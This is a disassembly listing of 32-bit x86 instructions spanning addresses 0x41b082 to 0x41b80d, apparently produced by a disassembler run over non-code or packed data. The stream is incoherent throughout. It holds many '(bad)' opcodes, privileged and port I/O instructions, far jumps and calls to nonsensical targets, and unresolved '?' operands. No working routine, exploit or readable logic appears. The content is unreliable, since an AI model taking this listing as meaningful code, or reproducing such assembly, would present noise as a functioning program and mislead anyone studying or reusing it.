  41b082:	and    DWORD PTR [eax-0x7cf7145b],0xcbd85a54
  41b08c:	dec    eax
  41b08d:	push   ebp
  41b08e:	stc    
  41b08f:	cmp    BYTE PTR [ebp+0x7f],dh
  41b092:	(bad)  
  41b093:	mov    esi,0x86a2f2d2
  41b098:	inc    eax
  41b099:	loop   0x41b0b0
  41b09b:	push   es
  41b09c:	inc    ebx
  41b09d:	rcl    DWORD PTR [ebp-0x63],0x6
  41b0a1:	stc    
  41b0a2:	push   edx
  41b0a3:	xchg   esi,eax
  41b0a4:	cmc    
  41b0a5:	push   esp
  41b0a6:	dec    WORD PTR [esi-0xf]
  41b0aa:	stos   DWORD PTR es:[edi],eax
  41b0ab:	jns    0x41b10a
  41b0ad:	mov    edx,DWORD PTR [esi]
  41b0af:	ds push ds
  41b0b1:	jbe    0x41b0ff
  41b0b3:	pop    ebx
  41b0b4:	daa    
  41b0b5:	xor    al,al
  41b0b7:	pop    esp
  41b0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ba:	ret    0xcb36
  41b0bd:	xlat   BYTE PTR ds:[ebx]
  41b0be:	mov    ebp,ecx
  41b0c0:	push   ecx
  41b0c1:	imul   ecx,DWORD PTR ds:0x9a01f6f8,0x69
  41b0c8:	cmc    
  41b0c9:	mov    esi,0x4272d896
  41b0ce:	pop    ebp
  41b0cf:	push   cs
  41b0d0:	sub    ebx,edx
  41b0d2:	bound  eax,QWORD PTR [edx-0x117c33bc]
  41b0d8:	(bad)  
  41b0d9:	sub    WORD PTR [ebp-0x666038ac],di
  41b0e0:	and    edi,DWORD PTR [eax-0x61df5aa]
  41b0e6:	loopne 0x41b0dd
  41b0e8:	add    al,dh
  41b0ea:	idiv   DWORD PTR [esi+eiz*8]
  41b0ed:	ror    BYTE PTR [ecx],1
  41b0ef:	jnp    0x41b0cf
  41b0f1:	pushf  
  41b0f2:	mov    eax,ds:0xfb215a08
  41b0f7:	mov    DWORD PTR [ebp-0x59],0x611516a8
  41b0fe:	mov    dl,BYTE PTR [edi+0x37]
  41b101:	add    al,0xab
  41b103:	push   edx
  41b104:	lods   al,BYTE PTR ds:[esi]
  41b105:	arpl   WORD PTR [edi-0x514dc711],di
  41b10b:	ret    0xc0ce
  41b10e:	pop    ds
  41b10f:	sti    
  41b110:	(bad)  [ecx-0x36]
  41b113:	add    al,BYTE PTR [eax-0x10e7711d]
  41b119:	rol    BYTE PTR [ecx-0x61a5bcdd],0x8f
  41b120:	gs cmp al,0xe3
  41b123:	or     esp,DWORD PTR [edx]
  41b125:	mov    edx,0x535a65e3
  41b12a:	aam    0x32
  41b12c:	cmp    DWORD PTR [edx],edx
  41b12e:	les    edi,FWORD PTR [eax]
  41b130:	stc    
  41b131:	gs icebp 
  41b133:	mov    bh,0xf9
  41b135:	sub    BYTE PTR ds:0x2e4ab16d,bh
  41b13b:	push   ebx
  41b13c:	cmp    eax,0xa776d147
  41b141:	lock rcr DWORD PTR cs:[ebp+0x7e],1
  41b146:	add    esi,0xffffff88
  41b149:	mov    ebp,0x6d45011e
  41b14e:	xchg   ebp,eax
  41b14f:	xchg   ecx,eax
  41b150:	add    cl,dl
  41b152:	inc    DWORD PTR [ecx-0x5d387269]
  41b158:	adc    bh,BYTE PTR [eax]
  41b15a:	into   
  41b15b:	(bad)  
  41b15c:	mov    ds:0xf6bc2b39,al
  41b161:	mov    ecx,0xd5a25668
  41b166:	xor    BYTE PTR [edi],al
  41b168:	xlat   BYTE PTR ds:[ebx]
  41b169:	in     eax,0x92
  41b16b:	loope  0x41b176
  41b16d:	fcmovnu st,st(6)
  41b16f:	stc    
  41b170:	mov    cl,0xc5
  41b172:	push   cs
  41b173:	pop    ecx
  41b174:	lock mov bl,0x9c
  41b177:	jb     0x41b0fb
  41b179:	test   BYTE PTR [ecx-0x79],ch
  41b17c:	(bad)  
  41b17d:	lods   al,BYTE PTR ds:[esi]
  41b17e:	pushf  
  41b17f:	push   esp
  41b180:	cmp    BYTE PTR [ebp+edx*8+0x6230d97a],bl
  41b187:	call   0x8fb9:0x40275953
  41b18e:	xor    eax,0xab4d4497
  41b193:	jmp    0x64d7d466
  41b198:	(bad)  
  41b199:	sbb    ecx,ebx
  41b19b:	mov    ch,0x84
  41b19d:	push   ss
  41b19e:	mov    eax,ds:0xba5a65d5
  41b1a3:	mov    DWORD PTR [ecx-0xc],edx
  41b1a6:	pop    ebx
  41b1a7:	mov    eax,ds:0x35cac08a
  41b1ac:	rcl    esp,cl
  41b1ae:	ror    al,1
  41b1b0:	jge    0x41b180
  41b1b2:	adc    BYTE PTR [ecx],0xc8
  41b1b5:	mov    bl,cl
  41b1b7:	aas    
  41b1b8:	rcl    BYTE PTR ds:0x51a78f36,cl
  41b1be:	dec    ecx
  41b1bf:	xlat   BYTE PTR ds:[ebx]
  41b1c0:	test   al,0xf7
  41b1c2:	mov    esp,esi
  41b1c4:	popf   
  41b1c5:	jmp    0x41b1bd
  41b1c7:	mov    eax,0xeec68296
  41b1cc:	arpl   WORD PTR [edx-0x6099b2ee],ax
  41b1d2:	jnp    0x41b169
  41b1d4:	ja     0x41b1e9
  41b1d6:	sub    cl,dl
  41b1d8:	mov    DWORD PTR [ecx-0x2f1616f1],0x4a32e885
  41b1e2:	and    dh,BYTE PTR [edx]
  41b1e4:	mov    eax,ds:0x3d4f1bd0
  41b1e9:	imul   edx,DWORD PTR [ebx-0x37],0xffffffab
  41b1ed:	dec    ebx
  41b1ee:	pushf  
  41b1ef:	cmp    bh,dl
  41b1f1:	test   al,0x1f
  41b1f3:	arpl   cx,dx
  41b1f5:	rol    dh,0x93
  41b1f8:	imul   eax,edx,0xac40a867
  41b1fe:	inc    edi
  41b1ff:	lods   eax,DWORD PTR ds:[esi]
  41b200:	sbb    cl,BYTE PTR [eax+esi*8-0x38]
  41b204:	ud2    
  41b206:	cmp    esp,DWORD PTR [esi+eax*4+0x4b]
  41b20a:	push   ebx
  41b20b:	push   0xf4f0aaa7
  41b210:	sub    ebp,DWORD PTR [ecx+0x5d]
  41b213:	mov    al,0x59
  41b215:	adc    ebx,DWORD PTR [edi+ebx*8+0x2fb19556]
  41b21c:	mov    ch,0xc5
  41b21e:	cwde   
  41b21f:	mov    WORD PTR [ebp-0xe],?
  41b222:	adc    DWORD PTR [esi+eiz*4-0x2ec2bddf],edx
  41b229:	pushf  
  41b22a:	xlat   BYTE PTR ds:[ebx]
  41b22b:	ror    BYTE PTR [edi-0x31a5b46d],cl
  41b231:	jg     0x41b284
  41b233:	xchg   esi,eax
  41b234:	lock push es
  41b236:	lock jmp 0xbdb1:0x220784ec
  41b23e:	sub    eax,0x58dc8f4c
  41b243:	shl    BYTE PTR [ecx+ebx*2],1
  41b246:	test   al,0x88
  41b248:	std    
  41b249:	xlat   BYTE PTR ds:[ebx]
  41b24a:	sbb    ah,BYTE PTR [ebx]
  41b24c:	push   ecx
  41b24d:	fisubr DWORD PTR [ebp+0x5aa8601c]
  41b253:	hlt    
  41b254:	pop    esp
  41b255:	push   ebx
  41b256:	or     dh,0x35
  41b259:	or     bh,bl
  41b25b:	pop    edx
  41b25c:	test   al,0xe2
  41b25e:	sbb    al,bh
  41b260:	mov    DWORD PTR [esp+eax*8+0x668c668a],ebp
  41b267:	sbb    ch,BYTE PTR [ebp+0x39]
  41b26a:	sub    BYTE PTR [ebx],dl
  41b26c:	leave  
  41b26d:	cmp    al,0x23
  41b26f:	outs   dx,DWORD PTR ds:[esi]
  41b270:	sub    BYTE PTR [ecx],bl
  41b272:	mulps  xmm5,XMMWORD PTR [eax-0x9a74789]
  41b279:	out    dx,eax
  41b27a:	jae    0x41b26b
  41b27c:	outs   dx,BYTE PTR ds:[esi]
  41b27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b27e:	sbb    eax,0x3dc6145
  41b283:	mul    BYTE PTR [edx+0x43dd1666]
  41b289:	add    ecx,DWORD PTR [ebp+0x6a]
  41b28c:	js     0x41b292
  41b28e:	pop    ebx
  41b28f:	push   ss
  41b290:	std    
  41b291:	jmp    0xee08:0xe23e9db9
  41b298:	mov    BYTE PTR [edx+0x6d],ah
  41b29b:	dec    esi
  41b29c:	pop    ds
  41b29d:	mov    ebx,0x99fd7162
  41b2a2:	pop    edx
  41b2a3:	inc    ebx
  41b2a4:	jne    0x41b289
  41b2a6:	lods   eax,DWORD PTR ds:[esi]
  41b2a7:	rcr    al,1
  41b2a9:	and    edx,DWORD PTR [eax]
  41b2ab:	iret   
  41b2ac:	cld    
  41b2ad:	dec    ebx
  41b2ae:	or     eax,0xe66e4e8d
  41b2b3:	shl    bh,cl
  41b2b5:	mov    ah,0xce
  41b2b7:	push   cs
  41b2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b9:	or     bl,bl
  41b2bb:	cmc    
  41b2bc:	push   edx
  41b2bd:	sar    BYTE PTR ds:0xaa5d8d82,0xb8
  41b2c4:	jecxz  0x41b307
  41b2c6:	aaa    
  41b2c7:	stos   BYTE PTR es:[edi],al
  41b2c8:	or     BYTE PTR [ecx-0x71],cl
  41b2cb:	repnz call 0x104b:0x439630e1
  41b2d3:	mov    al,0x8b
  41b2d5:	jle    0x41b27d
  41b2d7:	jb     0x41b275
  41b2d9:	jecxz  0x41b332
  41b2db:	and    ch,dl
  41b2dd:	fld    TBYTE PTR ds:[ebp-0x27cb8693]
  41b2e4:	xor    DWORD PTR [ebp-0x5fcfd99e],esi
  41b2ea:	sbb    eax,0xceb2afc
  41b2ef:	out    0xef,eax
  41b2f1:	pop    ebx
  41b2f2:	jb     0x41b345
  41b2f4:	ret    0x1525
  41b2f7:	pop    esp
  41b2f8:	pop    ebp
  41b2f9:	gs imul ebp,ecx,0xffffffcc
  41b2fd:	fimul  WORD PTR [esi+0x7d245830]
  41b304:	test   esi,esp
  41b306:	pop    esp
  41b307:	pop    ebp
  41b308:	and    al,0x95
  41b30a:	popa   
  41b30b:	icebp  
  41b30c:	in     al,dx
  41b30d:	cs std 
  41b30f:	xor    edi,DWORD PTR [ecx-0x34]
  41b312:	hlt    
  41b313:	scas   al,BYTE PTR es:[edi]
  41b314:	push   es
  41b315:	jmp    0x372:0xb2021b82
  41b31c:	jecxz  0x41b2f1
  41b31e:	pop    edx
  41b31f:	sbb    bl,ch
  41b321:	cs dec esi
  41b323:	les    edi,FWORD PTR [edi]
  41b325:	retf   
  41b326:	pusha  
  41b327:	jno    0x41b398
  41b329:	stos   BYTE PTR es:[edi],al
  41b32a:	xor    al,0xd8
  41b32c:	popf   
  41b32d:	add    ah,ch
  41b32f:	jl     0x41b30f
  41b331:	scas   al,BYTE PTR es:[edi]
  41b332:	sbb    al,0xa4
  41b334:	sub    al,0x4c
  41b336:	and    eax,DWORD PTR [ecx-0x17]
  41b339:	xchg   esp,eax
  41b33a:	or     eax,0x84d9cfef
  41b33f:	es stos BYTE PTR es:[edi],al
  41b341:	dec    ebx
  41b342:	add    eax,0x3ca8733
  41b347:	retf   0x85f4
  41b34a:	or     eax,0xb2439dd3
  41b34f:	dec    esi
  41b350:	xor    edx,ebx
  41b352:	imul   DWORD PTR [ecx-0xf]
  41b355:	inc    eax
  41b356:	jge    0x41b364
  41b358:	sbb    DWORD PTR [ebp+0x70c4751e],ebp
  41b35e:	cli    
  41b35f:	arpl   sp,bp
  41b361:	imul   ebx,DWORD PTR [esi-0x2b],0x16
  41b365:	mov    dl,0x24
  41b367:	lock push ds
  41b369:	xor    esi,DWORD PTR [ebp-0x42]
  41b36c:	lds    esp,FWORD PTR [ecx+0x54]
  41b36f:	test   DWORD PTR [ebp-0x1b],ebx
  41b372:	push   edx
  41b373:	lods   eax,DWORD PTR ds:[esi]
  41b374:	or     dh,0x74
  41b377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b378:	inc    esi
  41b379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b37a:	mov    esi,edi
  41b37c:	(bad)  
  41b37e:	out    dx,al
  41b37f:	rcr    BYTE PTR [esi+0x1],cl
  41b382:	ror    BYTE PTR [ebx-0x7436e4bf],1
  41b388:	scas   eax,DWORD PTR es:[edi]
  41b389:	sbb    eax,0xf2b17b6
  41b38e:	push   edx
  41b38f:	xlat   BYTE PTR ds:[ebx]
  41b390:	sbb    al,0x42
  41b392:	jb     0x41b402
  41b394:	clc    
  41b395:	cwde   
  41b396:	lahf   
  41b397:	mov    ch,0x38
  41b399:	loopne 0x41b3c9
  41b39b:	jmp    0xc3e84c13
  41b3a0:	or     eax,0x31de85fe
  41b3a5:	cmp    al,0xf0
  41b3a7:	shr    DWORD PTR [ebp+0x47],1
  41b3aa:	mov    bh,0x85
  41b3ac:	repnz and ebp,DWORD PTR [esi-0xc50c8f1]
  41b3b3:	add    edi,DWORD PTR [ebp+0x7941fbf8]
  41b3b9:	jg     0x41b357
  41b3bb:	cli    
  41b3bc:	and    BYTE PTR [ebx-0x59],al
  41b3bf:	into   
  41b3c0:	xabort 0x1
  41b3c3:	mov    ebx,0xd5358616
  41b3c8:	inc    edi
  41b3c9:	sbb    eax,ecx
  41b3cb:	iret   
  41b3cc:	sub    DWORD PTR [ebp-0x37],edi
  41b3cf:	addr16 add eax,0x1cc7daec
  41b3d5:	stos   BYTE PTR es:[edi],al
  41b3d6:	ror    BYTE PTR ds:0x62af7c43,cl
  41b3dc:	jl     0x41b3da
  41b3de:	bswap  ecx
  41b3e0:	ds jge 0x41b3b6
  41b3e3:	push   eax
  41b3e4:	repz pop es
  41b3e6:	xchg   ebx,eax
  41b3e7:	xchg   edi,eax
  41b3e8:	test   al,0x3c
  41b3ea:	xchg   edx,eax
  41b3eb:	rcl    BYTE PTR [esi+0x71],0x43
  41b3ef:	int    0x3a
  41b3f1:	sbb    ebx,DWORD PTR [ebp-0x2d48bdb9]
  41b3f7:	test   BYTE PTR [esi+0x315f29c2],ch
  41b3fd:	test   ecx,ebx
  41b3ff:	pop    eax
  41b400:	pop    edx
  41b401:	stos   BYTE PTR es:[edi],al
  41b402:	inc    esi
  41b403:	add    al,0x11
  41b405:	addr16 in al,0x55
  41b408:	dec    edi
  41b409:	xor    eax,DWORD PTR [edi]
  41b40b:	ins    BYTE PTR es:[edi],dx
  41b40c:	outs   dx,DWORD PTR fs:[esi]
  41b40e:	rol    edx,cl
  41b410:	bound  edi,QWORD PTR [edi]
  41b412:	ins    DWORD PTR es:[edi],dx
  41b413:	pop    esp
  41b414:	loope  0x41b3bb
  41b416:	add    al,0xe1
  41b418:	mov    ch,0x32
  41b41a:	push   ds
  41b41b:	adc    eax,0x4b592b95
  41b420:	fsubr  st(7),st
  41b422:	neg    ch
  41b424:	cmp    ebp,DWORD PTR [eax-0x97cec67]
  41b42a:	add    edx,DWORD PTR [edx]
  41b42c:	scas   al,BYTE PTR es:[edi]
  41b42d:	jge    0x41b3f2
  41b42f:	sub    al,BYTE PTR [edi+ecx*8-0x6af847b8]
  41b436:	jecxz  0x41b3f4
  41b438:	int3   
  41b439:	imul   ecx,DWORD PTR [edx],0xffffffe8
  41b43c:	arpl   WORD PTR [edx+0x18],dx
  41b43f:	jge    0x41b498
  41b441:	stc    
  41b442:	in     al,dx
  41b443:	mov    edi,0x30f335eb
  41b448:	mov    ebx,0x812ecb9
  41b44d:	nop
  41b44e:	and    eax,0x1ebe2c79
  41b453:	inc    edx
  41b454:	push   ds
  41b455:	mov    cl,0x5f
  41b457:	jne    0x41b475
  41b459:	inc    edi
  41b45a:	enter  0x81cc,0x5f
  41b45e:	retf   
  41b45f:	arpl   WORD PTR [esi],bx
  41b461:	xor    eax,0xb8646fb8
  41b466:	sahf   
  41b467:	idiv   esi
  41b469:	neg    BYTE PTR [ebp-0x48]
  41b46c:	push   ds
  41b46d:	stc    
  41b46e:	or     edi,DWORD PTR [eax-0x11]
  41b471:	aas    
  41b472:	out    0xe2,al
  41b474:	add    esp,DWORD PTR [ebp+esi*1-0x4f170b0e]
  41b47b:	jle    0x41b426
  41b47d:	mov    ?,WORD PTR [edx+0xedcd176]
  41b483:	xor    DWORD PTR [edi],ebp
  41b485:	adc    dh,BYTE PTR [edx+0x47]
  41b488:	fs retf 
  41b48a:	in     al,0x57
  41b48c:	pop    esp
  41b48d:	push   ds
  41b48e:	sub    DWORD PTR [eax],ebx
  41b490:	aad    0xec
  41b492:	mov    esp,0xef28ae7a
  41b497:	mov    ebp,DWORD PTR [ecx-0x7c]
  41b49a:	(bad)  
  41b49b:	call   0xb321afed
  41b4a0:	adc    DWORD PTR [ecx-0x64a7e1db],esp
  41b4a6:	dec    esi
  41b4a7:	fdivr  st,st(5)
  41b4a9:	mov    ah,0xe
  41b4ab:	sti    
  41b4ac:	jnp    0x41b4ae
  41b4ae:	mov    edx,0xf9507236
  41b4b3:	test   eax,0x4636e5a8
  41b4b8:	and    BYTE PTR [ebx+0x6],dl
  41b4bb:	jecxz  0x41b4c0
  41b4bd:	stos   BYTE PTR es:[edi],al
  41b4be:	and    DWORD PTR [esi],ebx
  41b4c0:	dec    esp
  41b4c1:	inc    esi
  41b4c2:	dec    esp
  41b4c3:	jbe    0x41b468
  41b4c5:	adc    al,0x6d
  41b4c7:	push   ebp
  41b4c8:	xchg   ecx,eax
  41b4c9:	shl    esp,1
  41b4cb:	fistp  WORD PTR [edx-0x1a3b9fe0]
  41b4d1:	ins    BYTE PTR es:[edi],dx
  41b4d2:	xchg   esp,eax
  41b4d3:	or     al,0xa0
  41b4d5:	in     eax,dx
  41b4d6:	mov    eax,0x78cd1677
  41b4db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4dc:	cmp    DWORD PTR [ecx],eax
  41b4de:	ret    
  41b4df:	aaa    
  41b4e0:	sub    al,0x57
  41b4e2:	test   BYTE PTR [eax+0x6494ac43],dl
  41b4e8:	in     eax,dx
  41b4e9:	ss std 
  41b4eb:	in     al,dx
  41b4ec:	inc    ebx
  41b4ed:	imul   ecx,DWORD PTR [edi+0x41],0x1fd29d24
  41b4f4:	scas   eax,DWORD PTR es:[edi]
  41b4f5:	ds inc ebp
  41b4f7:	fwait
  41b4f8:	or     al,BYTE PTR [ebx]
  41b4fa:	ja     0x41b55a
  41b4fc:	inc    eax
  41b4fd:	lock adc eax,0x46bd5555
  41b503:	popa   
  41b504:	and    eax,0xe0a92d
  41b509:	xrelease xchg BYTE PTR [esi],ch
  41b50c:	dec    edi
  41b50d:	sbb    BYTE PTR [eax-0x6c],bh
  41b510:	cmp    al,0x75
  41b512:	scas   al,BYTE PTR es:[edi]
  41b513:	mov    ecx,0x2b4bb371
  41b518:	cmp    BYTE PTR [eax+0x17],dh
  41b51b:	mov    eax,ds:0x1b79ae2e
  41b520:	or     eax,0x4cdcb64f
  41b525:	sbb    ebx,edx
  41b527:	cwde   
  41b528:	mov    ebp,0x7ea64d04
  41b52d:	repz mov esi,0x2b36c76a
  41b533:	and    BYTE PTR [eax+0x9],dl
  41b536:	sbb    bl,BYTE PTR [edx+ebp*2+0x5b0a4266]
  41b53d:	inc    ecx
  41b53e:	pop    ecx
  41b53f:	mov    dl,0x90
  41b541:	(bad)  
  41b542:	icebp  
  41b543:	dec    BYTE PTR [eax-0x1926d4ae]
  41b549:	mov    edx,0x43d14f55
  41b54e:	push   ds
  41b54f:	aaa    
  41b550:	sub    DWORD PTR ds:0x1827590a,ebx
  41b556:	(bad)  
  41b557:	bnd ja 0x41b54b
  41b55a:	sub    al,0x46
  41b55c:	cmp    eax,DWORD PTR [ebp+0x4dd2523b]
  41b562:	jne    0x41b57f
  41b564:	ins    BYTE PTR es:[edi],dx
  41b565:	and    eax,0xfffffff0
  41b568:	jge    0x41b5c4
  41b56a:	fwait
  41b56b:	out    0xd3,al
  41b56d:	aaa    
  41b56e:	add    DWORD PTR [ebx],eax
  41b570:	push   edx
  41b571:	int    0xa3
  41b573:	pop    edx
  41b574:	jo     0x41b52e
  41b576:	repnz mov ds:0xe01d0bb7,eax
  41b57c:	(bad)  
  41b57d:	das    
  41b57e:	mov    dh,dh
  41b580:	push   ebx
  41b581:	mov    ch,0xeb
  41b583:	and    al,0x46
  41b585:	jo     0x41b541
  41b587:	arpl   WORD PTR [edi+0x9],di
  41b58a:	imul   ebp,esi,0xffffffca
  41b58d:	cmp    edx,0xffffffb7
  41b590:	cmp    bl,BYTE PTR [esi-0x30881051]
  41b596:	and    al,BYTE PTR [ecx+0x40635a75]
  41b59c:	sub    edi,0x4c47e9a0
  41b5a2:	int    0x42
  41b5a4:	bound  edx,QWORD PTR [esi+0x15]
  41b5a7:	stos   BYTE PTR es:[edi],al
  41b5a8:	and    ebx,edx
  41b5aa:	lahf   
  41b5ab:	jnp    0x41b52d
  41b5ad:	aaa    
  41b5ae:	scas   eax,DWORD PTR es:[edi]
  41b5af:	mov    bh,BYTE PTR [ecx+0x2ad8715]
  41b5b5:	xor    edi,DWORD PTR [ebp+edx*4+0x453dffcf]
  41b5bc:	adc    BYTE PTR [ebp-0x66d6671e],dl
  41b5c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5c3:	mov    al,ds:0xebceb5d4
  41b5c8:	popa   
  41b5c9:	push   edi
  41b5ca:	cmp    eax,0x15d9e85e
  41b5cf:	or     DWORD PTR [ebx-0x35],edx
  41b5d2:	or     BYTE PTR [ebp+0x5],0x71
  41b5d6:	shl    DWORD PTR [ebx+0x73],cl
  41b5d9:	or     DWORD PTR ds:0xb56a688a,0xffffff80
  41b5e0:	mov    ch,0x92
  41b5e2:	pop    ebp
  41b5e3:	int    0xd
  41b5e5:	or     BYTE PTR [edx-0x68],dh
  41b5e8:	jbe    0x41b644
  41b5ea:	xchg   DWORD PTR [ebp-0x5000c95d],edi
  41b5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5f1:	or     esp,DWORD PTR [ebx+0xb28abcf]
  41b5f7:	sbb    eax,DWORD PTR [eax-0x1a]
  41b5fa:	sub    al,0x68
  41b5fc:	test   BYTE PTR [eax+0x1d],cl
  41b5ff:	xor    DWORD PTR [ecx+0x1f],edx
  41b602:	inc    esp
  41b603:	lock scas eax,DWORD PTR es:[edi]
  41b605:	ffree  st(2)
  41b607:	mov    esp,0xfa7102e1
  41b60c:	and    BYTE PTR [eax],al
  41b60e:	pop    ss
  41b60f:	inc    esp
  41b610:	mov    cl,0xc2
  41b612:	lea    eax,[si]
  41b615:	outs   dx,BYTE PTR ds:[esi]
  41b616:	dec    edi
  41b617:	and    edi,DWORD PTR [esi]
  41b619:	scas   al,BYTE PTR es:[edi]
  41b61a:	shr    DWORD PTR [esi],1
  41b61c:	in     eax,dx
  41b61d:	out    dx,al
  41b61e:	adc    eax,0x963b07de
  41b623:	mov    bl,0xbe
  41b625:	mov    ebp,0x8c9487e8
  41b62a:	xchg   ecx,eax
  41b62b:	ss repnz and al,0x75
  41b62f:	retf   0x5e2f
  41b632:	popa   
  41b633:	fisubr DWORD PTR [esi-0x66]
  41b636:	add    BYTE PTR [ecx+0x37],0x7d
  41b63a:	ret    
  41b63b:	add    edi,DWORD PTR [eax-0x4ca251f9]
  41b641:	scas   eax,DWORD PTR es:[edi]
  41b642:	add    edx,DWORD PTR [ecx*8-0x19b9eabb]
  41b649:	mov    eax,0x1e9bacd7
  41b64e:	popf   
  41b64f:	and    eax,0x851821c6
  41b654:	mov    ecx,0x95d2f86
  41b659:	mov    ds:0x4f6fca17,eax
  41b65e:	(bad)  
  41b65f:	fimul  WORD PTR [edx+ebx*1-0x387620c]
  41b666:	xchg   DWORD PTR [esi+esi*1+0x61],edi
  41b66a:	jecxz  0x41b5ff
  41b66c:	dec    esp
  41b66d:	adc    BYTE PTR [ebp-0x2046bf3b],bl
  41b673:	scas   eax,DWORD PTR es:[edi]
  41b674:	fiadd  DWORD PTR [edi-0x373ee504]
  41b67a:	cli    
  41b67b:	jno    0x41b6de
  41b67d:	mov    es,esp
  41b67f:	or     eax,0x41b5e117
  41b684:	sbb    al,0xc2
  41b686:	ss mov dl,0xe0
  41b689:	jle    0x41b6f9
  41b68b:	sub    edx,ecx
  41b68d:	cmp    edi,esp
  41b68f:	jmp    0x277a8d09
  41b694:	sub    edi,edx
  41b696:	aam    0x63
  41b698:	mov    ebx,ebx
  41b69a:	push   0x393c2876
  41b69f:	fstp   TBYTE PTR [bx+di-0x9]
  41b6a3:	ss sbb cl,0xcb
  41b6a7:	add    eax,0x4b911314
  41b6ac:	fbstp  TBYTE PTR [eax]
  41b6ae:	mov    esp,0x10170301
  41b6b3:	xlat   BYTE PTR ds:[ebx]
  41b6b4:	retf   
  41b6b5:	add    DWORD PTR [ebx-0x73],edx
  41b6b8:	cmp    al,0xb7
  41b6ba:	rcr    BYTE PTR [ebp+0x7c],0xd5
  41b6be:	cs int3 
  41b6c0:	dec    edi
  41b6c1:	mov    ah,0xb1
  41b6c3:	push   esp
  41b6c4:	or     al,0x39
  41b6c6:	add    al,0xe4
  41b6c8:	dec    ecx
  41b6c9:	sub    al,0x41
  41b6cb:	int3   
  41b6cc:	mov    ch,0xe2
  41b6ce:	push   ebx
  41b6cf:	lods   eax,DWORD PTR ds:[esi]
  41b6d0:	fs aas 
  41b6d2:	or     DWORD PTR [edi],edx
  41b6d4:	mov    ecx,0x570bab17
  41b6d9:	sbb    DWORD PTR [edx],eax
  41b6db:	mov    cl,BYTE PTR [eax+0x1aaf7f56]
  41b6e1:	mov    ch,0xf7
  41b6e3:	mov    esi,0xe09289dd
  41b6e8:	(bad)  
  41b6e9:	fnstcw WORD PTR [eax]
  41b6eb:	jae    0x41b732
  41b6ed:	jo     0x41b6ba
  41b6ef:	inc    ecx
  41b6f0:	jne    0x41b691
  41b6f2:	outs   dx,DWORD PTR ds:[esi]
  41b6f3:	leave  
  41b6f4:	push   ds
  41b6f5:	mov    esp,0x182e3f1
  41b6fa:	add    eax,0xfcae0b80
  41b6ff:	sub    al,0xc1
  41b701:	(bad)  
  41b702:	(bad)  
  41b704:	dec    esp
  41b705:	push   ebp
  41b706:	mov    dl,0x73
  41b708:	mov    eax,ds:0x7b1df20c
  41b70d:	mov    gs,WORD PTR [ecx+0x9299f97]
  41b713:	xchg   BYTE PTR [edi-0x5868401e],ah
  41b719:	jge    0x41b6c8
  41b71b:	push   esp
  41b71c:	ret    0x5dca
  41b71f:	dec    esi
  41b720:	cmp    ecx,ebx
  41b722:	test   BYTE PTR [edx],0x20
  41b725:	mov    bl,0xf3
  41b727:	mov    ds:0xf85313b7,al
  41b72c:	loop   0x41b703
  41b72e:	dec    esi
  41b72f:	sti    
  41b730:	out    dx,al
  41b731:	leave  
  41b732:	pushf  
  41b733:	test   al,0xb8
  41b735:	pop    eax
  41b736:	fldenv [ecx]
  41b738:	js     0x41b6ff
  41b73a:	clc    
  41b73b:	jmp    0x4656398
  41b740:	inc    ecx
  41b741:	nop
  41b742:	das    
  41b743:	int    0xa
  41b745:	mov    ebp,DWORD PTR ds:0x6d18c2d8
  41b74b:	add    ecx,DWORD PTR [esp+edi*1]
  41b74e:	enter  0x31ad,0x87
  41b752:	(bad)  
  41b753:	shr    DWORD PTR [ecx+0xf95139d],1
  41b759:	call   0xba53:0xa1d78ddc
  41b760:	mov    eax,ds:0xeb7a0c11
  41b765:	xor    ebx,ebx
  41b767:	mov    ah,0x7f
  41b769:	xchg   DWORD PTR [ecx-0x7614860a],eax
  41b76f:	xchg   ecx,eax
  41b770:	repnz dec esi
  41b772:	ret    0xcf3d
  41b775:	daa    
  41b776:	mov    al,0x41
  41b778:	mov    ebx,0xa3ef99c9
  41b77d:	cs sub eax,0x56b1ac05
  41b783:	(bad)  [ecx]
  41b785:	jle    0x41b76e
  41b787:	mov    esp,0x63b1b811
  41b78c:	cmc    
  41b78d:	aas    
  41b78e:	adc    eax,DWORD PTR [eax-0x49]
  41b791:	arpl   WORD PTR [esp+ebx*1],sp
  41b794:	xor    edi,DWORD PTR [ecx-0x2d]
  41b797:	and    ch,BYTE PTR [edx]
  41b799:	(bad)  
  41b79a:	fdiv   st,st(0)
  41b79c:	in     al,dx
  41b79d:	lock int 0xac
  41b7a0:	xchg   BYTE PTR [edi+0x61],dl
  41b7a3:	mov    cs,edx
  41b7a5:	pop    edx
  41b7a6:	sbb    dh,ch
  41b7a8:	sahf   
  41b7a9:	pop    ebp
  41b7aa:	sub    bl,BYTE PTR [esi-0x1]
  41b7ad:	mov    ch,BYTE PTR [ecx-0x10]
  41b7b0:	imul   eax,edi,0xce0962aa
  41b7b6:	hlt    
  41b7b7:	mov    WORD PTR [ebx-0x5953a325],cs
  41b7bd:	sti    
  41b7be:	jae    0x467cd4d2
  41b7c4:	mov    BYTE PTR [ebp-0x73327aaf],0x2e
  41b7cb:	je     0x41b7d9
  41b7cd:	fcom   DWORD PTR ds:0x58e6c43f
  41b7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7d4:	xor    al,0x29
  41b7d6:	outs   dx,DWORD PTR ds:[esi]
  41b7d7:	test   DWORD PTR [eax-0x7b],0x3d740890
  41b7de:	popf   
  41b7df:	out    0xa1,eax
  41b7e1:	dec    ebp
  41b7e2:	in     eax,0xd6
  41b7e4:	loope  0x41b7df
  41b7e6:	mov    BYTE PTR [ebp-0x73],dh
  41b7e9:	retf   0xd055
  41b7ec:	cld    
  41b7ed:	pop    es
  41b7ee:	jg     0x41b7f2
  41b7f0:	mov    eax,ds:0x2c85b67d
  41b7f5:	jecxz  0x41b821
  41b7f7:	adc    dl,BYTE PTR [ebp-0x22e6f7c]
  41b7fd:	test   BYTE PTR [eax+edi*8+0x46],ah
  41b801:	mov    ebp,0xa2febdfa
  41b806:	adc    ecx,ecx
  41b808:	mov    ebp,0x8c8024cd
  41b80d:	js     0x41b884
